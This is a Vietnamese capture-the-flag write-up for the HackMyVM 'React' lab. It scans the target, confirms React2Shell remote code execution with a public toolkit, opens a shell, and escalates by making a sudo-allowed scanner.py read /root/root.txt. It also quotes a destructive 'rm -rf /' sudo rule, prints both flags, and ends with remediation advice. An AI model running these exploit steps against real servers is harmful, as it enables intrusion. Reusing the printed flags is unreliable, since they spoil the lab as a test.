# HackMyVM — React

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy React (Target) | `10.0.2.4` |
| Hệ điều hành Target | Linux / Debian |
| SSH | `22/tcp` — OpenSSH 8.4p1 Debian 5+deb11u3 |
| HTTP | `80/tcp` — Apache httpd 2.4.62 (Debian) |
| Next.js / React RSC | `3000/tcp` |
| Initial user | `bot` |
| User flag | `flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}` |
| Root flag | `flag{root-bc29a7159b63b18dc294002be32e1c22}` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: ping, scan, clone toolkit, chạy detection/exploit và mở interactive shell.
> - 🟥 **Terminal React**: shell tương tác được mở qua `./shell.sh` (không phải SSH). Dùng để kiểm tra user, đọc flag, chạy `sudo` và leo thang đặc quyền.
>
> **Lưu ý quan trọng:** Terminal React không phải phiên SSH. Mỗi lệnh trên shell này là một HTTP request tới ứng dụng Next.js. Không chạy nhầm lệnh giữa 2 máy.

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định IP, các cổng mạng đang mở, dịch vụ đang chạy và thông tin công nghệ có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định máy Target

### 🟦 Kali

```bash
sudo su
```

Quét các máy đang hoạt động:

```bash
nmap -sn 10.0.2.0/24
```

Kết quả quan trọng:

```text
Nmap scan report for 10.0.2.4
Host is up.
MAC Address: 08:00:27:10:45:82 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.15
Host is up.
```

Xác định:

```text
Kali  = 10.0.2.15
React = 10.0.2.4
```

---

## 1.2. Kiểm tra kết nối

### 🟦 Kali

```bash
ping -c 4 10.0.2.4
```

Kết quả:

```text
4 packets transmitted, 4 received, 0% packet loss
rtt min/avg/max/mdev = 0.389/0.602/1.013/0.252 ms
```

Máy Target đang hoạt động và có thể kết nối từ Kali.

---

## 1.3. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.4
```

Kết quả:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Các cổng cần chú ý:

```text
22/tcp    SSH
80/tcp    HTTP
3000/tcp  Web application (Next.js)
```

> `ppp` là tên service Nmap gán khi chưa nhận diện chính xác ứng dụng trên port 3000. Không dùng tên này để kết luận ứng dụng.

---

## 1.4. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -p- -sCV -Pn -T4 10.0.2.4
```

Kết quả quan trọng:

```text
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
3000/tcp open  ppp?
```

Port 3000 trả về các header đặc trưng:

```text
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch,
      Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
```

Nmap xác định hệ thống:

```text
Service Info: OS: Linux
CPE: cpe:/o:linux:linux_kernel
```

Điểm đáng chú ý:

```text
3000/tcp → Next.js / React Server Components
```

---

## 1.5. Kiểm tra HTTP port 3000

### 🟦 Kali

```bash
curl -I http://10.0.2.4:3000
```

Kết quả:

```text
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
```

Lấy HTML:

```bash
curl -s http://10.0.2.4:3000 | head
```

Trang trả về có:

```text
<title>Create Next App</title>
```

---

## 1.6. Kiểm tra HTTP port 80

### 🟦 Kali

```bash
curl -I http://10.0.2.4
```

Kết quả:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.62 (Debian)
Content-Type: text/html; charset=UTF-8
```

> Trong quá trình khai thác thực tế, điểm vào được sử dụng là **Next.js trên port 3000**.

---

## 1.7. Xác định điểm vào

```text
22/tcp
   └── SSH

80/tcp
   └── Apache HTTP

3000/tcp
   └── Next.js
       └── React Server Components  ← điểm vào chính
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác ứng dụng Next.js / React Server Components để đạt quyền thực thi lệnh trên Target, lấy `user.txt`, sau đó phân tích quyền `sudo` và khai thác `scanner.py` để đọc `root.txt`.**

## 2.1. Chuẩn bị React2Shell toolkit

### 🟦 Kali

```bash
git clone https://github.com/freeqaz/react2shell.git
cd react2shell
ls -la
```

Các file quan trọng:

```text
detect.sh
exploit-redirect.sh
exploit-reflect.sh
exploit-throw.sh
exploit-urlencoded.sh
exploit-blind.sh
exfil-file.sh
enumerate-actions.sh
shell.sh
EXPLOIT_NOTES.md
README.md
```

---

## 2.2. Kiểm tra lỗ hổng React2Shell

### 🟦 Kali

```bash
./detect.sh http://10.0.2.4:3000
```

Kết quả thực tế:

```text
[*] React2Shell Detection Probe (CVE-2025-55182 / CVE-2025-66478)
[*] Target: http://10.0.2.4:3000

[*] HTTP Status: 500
[!] VULNERABLE - Server returned 500 with E{"digest" pattern

[*] Response body:
0:{"a":"$@1","f":"","b":"hDdKHNo1UJL-Lyo7H7gUa"}
1:E{"digest":"1949546682"}

[!] This server is running a vulnerable version of React RSC / Next.js
[!] Upgrade to Next.js 16.0.7+ or React 19.2.1+ immediately
```

**Kết luận:** Target vulnerable với `CVE-2025-55182 / CVE-2025-66478`.

---

## 2.3. Chứng minh RCE

### 🟦 Kali

```bash
./exploit-redirect.sh http://10.0.2.4:3000 "id"
```

Kết quả:

```text
[+] Command output:
----------------------------------------
uid=1000(bot) gid=1000(bot) groups=1000(bot)
----------------------------------------
```

Như vậy đã thực thi được lệnh trên Target với tài khoản `bot`.

---

## 2.4. Mở interactive shell

### 🟦 Kali

```bash
./shell.sh http://10.0.2.4:3000
```

Kết quả:

```text
Connected!
  User: bot
  Host: React
  CWD:  /opt/target
```

Prompt xuất hiện:

```text
bot@React:/opt/target$
```

**Từ đây, tiếp tục toàn bộ các lệnh dưới đây trong 🟥 TERMINAL REACT.**

---

## 2.5. Xác nhận tài khoản

### 🟥 React

```bash
whoami
```

Kết quả:

```text
bot
```

```bash
id
```

Kết quả:

```text
uid=1000(bot) gid=1000(bot) groups=1000(bot)
```

```bash
pwd
```

Kết quả:

```text
/opt/target
```

---

## 2.6. Đọc user.txt

### 🟥 React

```bash
cd /home/bot
ls -la
cat user.txt
```

Kết quả:

```text
flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}
```

**Bằng chứng:** đã có quyền truy cập tài khoản `bot` và đọc được user flag.

---

## 2.7. Kiểm tra quyền sudo

### 🟥 React

```bash
sudo -l
```

Kết quả:

```text
User bot may run the following commands on React:
    (ALL) NOPASSWD: /opt/react2shell/scanner.py
    (ALL) NOPASSWD: /usr/bin/rm -rf /
```

Có hai rule. Hướng sử dụng là `scanner.py`.

> ⚠️ **Không chạy** `sudo /usr/bin/rm -rf /`. Đây là lệnh phá hủy hệ thống và không cần thiết cho bài lab.

---

## 2.8. Phân tích scanner.py

### 🟥 React

```bash
ls -la /opt/react2shell/scanner.py
```

Kết quả:

```text
-rwxr-xr-x 1 root root 19627 Dec 13 2025 /opt/react2shell/scanner.py
```

Xem source (phần quan trọng):

```bash
cat /opt/react2shell/scanner.py
```

Điểm then chốt trong source:

```python
def load_hosts(hosts_file: str) -> List[str]:
    hosts = []
    try:
        with open(hosts_file, "r") as f:
            for line in f:
                host = line.strip()
                if host and not host.startswith("#"):
                    hosts.append(host)
```

Scanner có tham số `-l` / `--list` để nhận file danh sách host. Vì chương trình được phép chạy bằng **sudo**, nó có thể mở file mà `bot` bình thường không đọc được.

Khi kết nối thất bại, chuỗi lỗi cũng trả lại nội dung:

```python
except requests.exceptions.ConnectionError as e:
    return None, f"Connection Error: {str(e)}"
```

---

## 2.9. Leo thang đặc quyền / đọc root flag

### 🟥 React

**Chạy chính xác lệnh sau:**

```bash
sudo /opt/react2shell/scanner.py -l /root/root.txt
```

Kết quả thực tế chứa:

```text
[ERROR] flag{root-bc29a7159b63b18dc294002be32e1c22} - Connection Error:
HTTPSConnectionPool(host='flag%7broot-bc29a7159b63b18dc294002be32e1c22%7d', port=443): ...
```

**Root flag:**

```text
flag{root-bc29a7159b63b18dc294002be32e1c22}
```

### Vì sao khai thác được?

```text
bot
 │
 └── sudo NOPASSWD
        │
        ▼
 /opt/react2shell/scanner.py
        │
        │ -l /root/root.txt
        ▼
 load_hosts("/root/root.txt")
        │
        ▼
 open("/root/root.txt", "r")   ← chạy bằng root
        │
        ▼
 đọc flag bằng quyền root
        │
        ▼
 flag trở thành "hostname"
        │
        ▼
 request thất bại / DNS error
        │
        ▼
 error message chứa lại flag
```

Đây là lỗi thiết kế của privileged utility: chương trình được cấp quyền root nhưng cho phép người gọi **kiểm soát đường dẫn file đầu vào**.

---

## 2.10. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │
            │ HTTP :3000
            ▼
┌────────────────────────┐
│ 🟥 REACT 10.0.2.4      │
│ Next.js / React RSC    │
└───────────┬────────────┘
            │
            │ React2Shell
            │ CVE-2025-55182 / CVE-2025-66478
            ▼
┌────────────────────────┐
│ RCE                    │
│ bot (uid=1000)         │
└───────────┬────────────┘
            │
            ├── /home/bot/user.txt  → USER FLAG
            │
            ▼
┌────────────────────────┐
│ sudo -l                │
│ NOPASSWD: scanner.py   │
└───────────┬────────────┘
            │
            │ -l /root/root.txt
            ▼
┌────────────────────────┐
│ scanner chạy bằng root │
│ đọc /root/root.txt     │
│ lỗi DNS lộ flag        │
└───────────┬────────────┘
            │
            ▼
┌────────────────────────┐
│ ROOT FLAG              │
└────────────────────────┘
```

---

## 2.11. Hai terminal — làm theo đúng thứ tự

### 🟦 TERMINAL KALI

```bash
# 1. Chuyển root
sudo su

# 2. Host discovery
nmap -sn 10.0.2.0/24

# 3. Kiểm tra kết nối
ping -c 4 10.0.2.4

# 4. Quét TCP
nmap -p- -Pn -T4 10.0.2.4
nmap -p- -sCV -Pn -T4 10.0.2.4

# 5. Kiểm tra HTTP
curl -I http://10.0.2.4:3000
curl -s http://10.0.2.4:3000 | head
curl -I http://10.0.2.4

# 6. Clone toolkit
git clone https://github.com/freeqaz/react2shell.git
cd react2shell

# 7. Detection
./detect.sh http://10.0.2.4:3000

# 8. Chứng minh RCE
./exploit-redirect.sh http://10.0.2.4:3000 "id"

# 9. Mở interactive shell
./shell.sh http://10.0.2.4:3000
```

Sau khi thấy prompt:

```text
bot@React:/opt/target$
```

→ chuyển sang **🟥 TERMINAL REACT**.

### 🟥 TERMINAL REACT

```bash
# 10. Kiểm tra user
whoami
id
pwd

# 11. User flag
cd /home/bot
ls -la
cat user.txt

# 12. Sudo
sudo -l

# 13. Phân tích scanner
ls -la /opt/react2shell/scanner.py
cat /opt/react2shell/scanner.py

# 14. Đọc root flag
sudo /opt/react2shell/scanner.py -l /root/root.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn RCE, truy cập trái phép và leo thang đặc quyền.**

## 3.1. Nguyên nhân chính

### 1. Next.js / React Server Components vulnerable

Detection cho thấy:

```text
CVE-2025-55182 / CVE-2025-66478
```

Toolkit xác nhận response phù hợp với pattern vulnerable.

### 2. RCE tạo quyền thực thi dưới `bot`

```text
uid=1000(bot) gid=1000(bot) groups=1000(bot)
```

### 3. Sudo rule cho `scanner.py` quá rộng

```text
(ALL) NOPASSWD: /opt/react2shell/scanner.py
```

Trong khi scanner hỗ trợ đường dẫn file tùy ý qua `-l/--list` và source dùng:

```python
with open(hosts_file, "r") as f:
```

### 4. Error message phản chiếu dữ liệu nhạy cảm

Nội dung đọc từ `/root/root.txt` xuất hiện trong lỗi `Connection Error`, làm lộ root flag.

---

## 3.2. Biện pháp khắc phục

### Cập nhật React / Next.js

Cập nhật lên phiên bản đã được nhà cung cấp xác nhận đã khắc phục lỗ hổng. Detection của toolkit trong lab hiển thị:

```text
Next.js 16.0.7+
React 19.2.1+
```

Khi triển khai thực tế cần đối chiếu advisory/changelog chính thức của phiên bản đang sử dụng.

### Loại bỏ sudo rộng cho scanner

Không cấp `NOPASSWD` trực tiếp cho một scanner có thể nhận đường dẫn file tùy ý.

Nếu cần privileged scanning:

- Whitelist input
- Giới hạn thư mục
- Giới hạn arguments trong sudoers
- Tách privileged operation thành chương trình chuyên biệt
- Chỉ cấp quyền tối thiểu

### Kiểm soát đường dẫn file

Không cho phép người dùng truyền tùy ý:

```text
/root/...
/etc/...
/home/other-user/...
```

Cần canonicalize và kiểm tra path nằm trong thư mục được phép.

### Không phản chiếu dữ liệu nhạy cảm trong lỗi

Thông báo lỗi nên tránh đưa nguyên URL/hostname chứa secret ra giao diện. Chi tiết có thể ghi vào log nội bộ, còn client nhận lỗi tổng quát.

### Least Privilege

Tài khoản ứng dụng `bot` chỉ nên có đúng quyền cần thiết và không có đường dẫn trực tiếp tới dữ liệu root.

### Gia cố và giám sát

Rà soát định kỳ:

```bash
sudo -l
```

Đồng thời giám sát:

- Request bất thường tới React/Next.js RSC
- Process con được tạo bởi web service
- Sudo invocation bất thường
- Truy cập `/root` từ service account
- DNS lookup bất thường
- Thay đổi sudoers và file permission

---

# Kết luận ngắn gọn

## Câu 1

Target:

```text
10.0.2.4
```

Dịch vụ:

```text
22/tcp    SSH — OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp    HTTP — Apache 2.4.62
3000/tcp  Next.js / React Server Components
```

## Câu 2

Initial access:

```text
Next.js / React RSC
        ↓
React2Shell (CVE-2025-55182 / CVE-2025-66478)
        ↓
RCE
        ↓
bot
```

User flag:

```text
flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}
```

Privilege escalation:

```text
sudo -l
   ↓
NOPASSWD: /opt/react2shell/scanner.py
   ↓
-l /root/root.txt
   ↓
scanner đọc file bằng root
   ↓
Connection Error làm lộ flag
```

Root flag:

```text
flag{root-bc29a7159b63b18dc294002be32e1c22}
```

## Câu 3

Khắc phục trọng tâm:

```text
Cập nhật Next.js / React
        +
Loại bỏ RCE
        +
Không cấp sudo rộng cho scanner
        +
Giới hạn đường dẫn input
        +
Không phản chiếu dữ liệu nhạy cảm trong error
        +
Least Privilege
        +
Logging + Monitoring
```

---

# Flags

### User Flag

```text
flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}
```

### Root Flag

```text
flag{root-bc29a7159b63b18dc294002be32e1c22}
```
